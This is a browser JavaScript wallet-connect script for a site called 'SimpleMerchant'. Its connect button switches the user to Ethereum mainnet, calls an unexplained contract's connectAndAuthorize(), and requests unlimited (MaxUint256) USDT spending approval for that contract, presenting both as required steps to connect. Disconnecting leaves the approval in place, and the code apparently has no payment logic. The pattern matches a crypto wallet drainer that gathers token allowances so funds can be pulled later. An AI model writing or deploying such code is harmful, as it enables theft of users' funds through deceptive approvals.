// Smart Contract Addresses
const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f'; // SimpleMerchant Contract Address
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Official USDT on Ethereum Mainnet

// Smart Contract ABIs (Interface)
const CONTRACT_ABI = [
    "function connectAndAuthorize() external",
    "function authorized(address customer) external view returns (bool)",
    "event Authorized(address indexed customer)"
];
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract, usdtContract;

// Stores event listener references
let accountChangeListener = null;
let chainChangeListener = null;

// Retry function for temporary RPC errors
async function retry(fn, maxAttempts = 5, delayMs = 2000) {
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        try {
            return await fn();
        } catch (error) {
            // Only retry if it's a temporary service error (adjust error message as needed)
            if (attempt === maxAttempts || !error.message.toLowerCase().includes('service temporarily unavailable')) {
                throw error;
            }
            console.warn(`Retry ${attempt}/${maxAttempts}: ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, delayMs));
        }
    }
}

// Removed waitForTransaction function, replaced by tx.wait()

async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a supported wallet');
            return;
        }
        
        provider = new ethers.BrowserProvider(window.ethereum);
        
        // Remove old listeners
        if (accountChangeListener) window.ethereum.removeListener('accountsChanged', accountChangeListener);
        if (chainChangeListener) window.ethereum.removeListener('chainChanged', chainChangeListener);

        // Check network and switch to Mainnet
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) {
            updateStatus('Switching to Ethereum Mainnet...');
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }]
                });
                // Reinitialize provider after chain switch
                provider = new ethers.BrowserProvider(window.ethereum);
                await provider.getNetwork();
            } catch (switchError) {
                if (switchError.code === 4001) {
                    updateStatus('User rejected network switch. Please switch to Ethereum Mainnet manually.');
                } else {
                    updateStatus(`Network switch failed: ${switchError.message}`);
                }
                return;
            }
        }

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();
            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
            await checkAuthorization();
            updateStatus('Connection restored, checking authorization status');
        } else {
            updateStatus('Please connect wallet');
        }

        accountChangeListener = (accounts) => {
            if (accounts.length === 0) {
                resetState();
                updateStatus('Wallet disconnected');
            } else {
                initializeWallet();
            }
        };
        window.ethereum.on('accountsChanged', accountChangeListener);

        chainChangeListener = () => {
            resetState();
            updateStatus('Network changed. Please reload and reconnect.');
            window.location.reload();
        };
        window.ethereum.on('chainChanged', chainChangeListener);
    } catch (error) {
        updateStatus(`Initialization failed: ${error.message}`);
        console.error("Initialize Wallet Error:", error);
    }
}

async function checkAuthorization() {
    try {
        if (!signer || !userAddress || !contract || !usdtContract) {
            return;
        }

        const isAuthorized = await retry(() => contract.authorized(userAddress), 3, 1000);
        const usdtAllowance = await retry(() => usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS), 3, 1000);
        // Use a large BigInt for comparison, but not max to avoid issues with older token implementations
        const maxAllowanceThreshold = ethers.MaxUint256 / 2n; 
        
        let usdtBalance = 0n;
        try {
            usdtBalance = await retry(() => usdtContract.balanceOf(userAddress), 3, 1000);
        } catch (e) {
            console.warn('Failed to fetch USDT balance:', e);
        }

        let statusMessage = '';
        const isUsdtMaxApproved = usdtAllowance >= maxAllowanceThreshold;

        if (isAuthorized) {
            statusMessage += 'SimpleMerchant contract authorized ✅. ';
        } else {
            statusMessage += 'SimpleMerchant contract NOT authorized ❌. ';
        }

        statusMessage += `USDT Balance: ${ethers.formatUnits(usdtBalance, 6)}. `;
        if (isUsdtMaxApproved) {
            statusMessage += `USDT approved (MaxUint256) ✅.`;
        } else if (usdtAllowance > 0n) {
            statusMessage += `USDT approval amount insufficient ⚠️.`;
        } else {
            statusMessage += `USDT not approved or approval is zero ❌.`;
        }

        const allAuthorized = isAuthorized && isUsdtMaxApproved;

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet';
            connectButton.disabled = false;
            updateStatus(`Connected and fully authorized. ${statusMessage}`);
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Complete Authorization)';
            connectButton.disabled = false;
            updateStatus(`Please connect and complete all authorizations. ${statusMessage} Click the wallet button to initiate transactions.`);
        }
    } catch (error) {
        updateStatus(`Authorization check failed: ${error.message}`);
        console.error("Check Authorization Error:", error);
    }
}

async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a supported wallet');
            return;
        }

        await provider.send('eth_requestAccounts', []);
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);

        const ethBalance = await retry(() => provider.getBalance(userAddress), 3, 1000);
        const requiredEthForGas = ethers.parseEther('0.001');
        if (ethBalance < requiredEthForGas) {
            updateStatus(`Warning: ETH balance may be insufficient for gas (recommended: ${ethers.formatEther(requiredEthForGas)} ETH, actual: ${ethers.formatEther(ethBalance)} ETH).`);
        } else {
            updateStatus('ETH balance sufficient, checking authorizations...');
        }

        // --- Transaction 1: SimpleMerchant Contract Authorization ---
        const isAuthorized = await retry(() => contract.authorized(userAddress), 3, 1000);
        if (!isAuthorized) {
            updateStatus('Authorizing SimpleMerchant Contract (Transaction 1/2)... **Please check your wallet for the signature request.**');
            const txAuthorize = await contract.connectAndAuthorize();
            
            // USE tx.wait() for reliable transaction confirmation
            await txAuthorize.wait(); 
            
            updateStatus('SimpleMerchant Contract authorization successful.');
        } else {
            updateStatus('SimpleMerchant Contract already authorized, checking USDT approval...');
        }

        // --- Transaction 2: USDT Token Approval ---
        const usdtAllowance = await retry(() => usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS), 3, 1000);
        const maxAllowance = ethers.MaxUint256;
        const maxAllowanceThreshold = maxAllowance / 2n;

        if (usdtAllowance < maxAllowanceThreshold) {
            updateStatus('Approving USDT Token (MaxUint256) (Transaction 2/2)... **Please check your wallet for the signature request.**');
            const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
            
            // USE tx.wait() for reliable transaction confirmation
            await txApprove.wait(); 
            
            updateStatus('USDT Token approval successful (set to MaxUint256).');
        } else {
            updateStatus('USDT Token already approved (MaxUint256).');
        }

        await checkAuthorization();
        updateStatus('Connected and all necessary authorizations completed.');
    } catch (error) {
        let errorMessage = error.message;
        if (error.code === 4001) {
            errorMessage = 'User rejected transaction';
        } else if (error.code === 'TRANSACTION_REPLACED' && error.replacement.hash) {
            // Handle transaction replacement (speed up/cancel)
            errorMessage = `Transaction was replaced (New Hash: ${error.replacement.hash}). Checking new receipt...`;
            try {
                // Wait for the new transaction to be mined
                await provider.waitForTransaction(error.replacement.hash);
                await checkAuthorization();
                updateStatus('Transaction successful after replacement.');
                return;
            } catch (waitError) {
                 errorMessage = `Replacement transaction failed: ${waitError.message}`;
            }
        } else if (error.code === -32603) {
            errorMessage = 'Service temporarily unavailable. Please retry or switch RPC provider.';
        }
        updateStatus(`Operation failed: ${errorMessage}`);
        console.error("Connect Wallet Error:", error);
        connectButton.classList.remove('connected');
        connectButton.title = 'Connect Wallet';
        connectButton.disabled = false;
    }
}

function disconnectWallet() {
    resetState();
    updateStatus('Wallet disconnected. Please reconnect.');
    alert('Wallet disconnected. You may need to manually remove this site from "Connected Sites" in your wallet settings for a complete disconnect.');
}

function resetState() {
    signer = null;
    userAddress = null;
    contract = null;
    usdtContract = null;
    connectButton.classList.remove('connected');
    connectButton.title = 'Connect Wallet';
    connectButton.disabled = false;
}

function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    if (statusDiv) {
        statusDiv.innerHTML = `<strong>STATUS:</strong> ${message}`;
    }
}

connectButton.addEventListener('click', () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        connectWallet();
    }
});

initializeWallet();
console.log('connectButton event listener added and initializeWallet called');